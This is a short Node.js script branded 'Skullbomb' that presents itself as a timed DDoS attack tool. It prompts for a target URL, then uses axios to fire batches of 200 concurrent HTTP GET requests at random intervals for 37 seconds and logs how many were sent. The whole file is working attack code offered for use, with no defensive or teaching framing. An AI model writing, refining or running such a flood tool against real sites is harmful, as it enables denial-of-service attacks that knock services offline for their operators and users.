const axios = require('axios');

// ASCII art for Skullbomb
console.log(`
   _____ ____  ____  ________  __
  / ___// __ \\/ __ \\/_  __/\\ \\/ /
  \\__ \\/ /_/ / / / / / /    \\  / 
 ___/ / ____/ /_/ / / /     / /  
/____/_/    \\____/ /_/     /_/   
                                 
Skullbomb : This script performs a timed DDoS attack...
`);

// Prompt user for target URL
const readline = require('readline');
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

rl.question('Enter the target URL: ', (url) => {
  const numRequests = 10000; // Total requests
  const concurrentRequests = 200; // Requests per batch
  const timeoutSeconds = 0.1; // Timeout for each request in seconds
  const durationSeconds = 37; // Attack duration
  let totalRequestsSent = 0;

  // Function to send requests
  const sendRequests = async () => {
    const requests = [];
    for (let i = 0; i < concurrentRequests; i++) {
      requests.push(
        axios.get(url, { timeout: timeoutSeconds * 1000 }).catch(() => null)
      );
    }
    await Promise.all(requests);
    totalRequestsSent += concurrentRequests;
    console.log(`Requests sent: ${totalRequestsSent}`);
  };

  // Start the attack
  const startTime = Date.now();
  const interval = setInterval(async () => {
    if ((Date.now() - startTime) / 1000 >= durationSeconds) {
      clearInterval(interval);
      console.log(`Final number of requests sent: ${totalRequestsSent}`);
      console.log('Attack completed.');
      rl.close();
      return;
    }
    await sendRequests();
  }, Math.random() * 500); // Random delay between batches
});
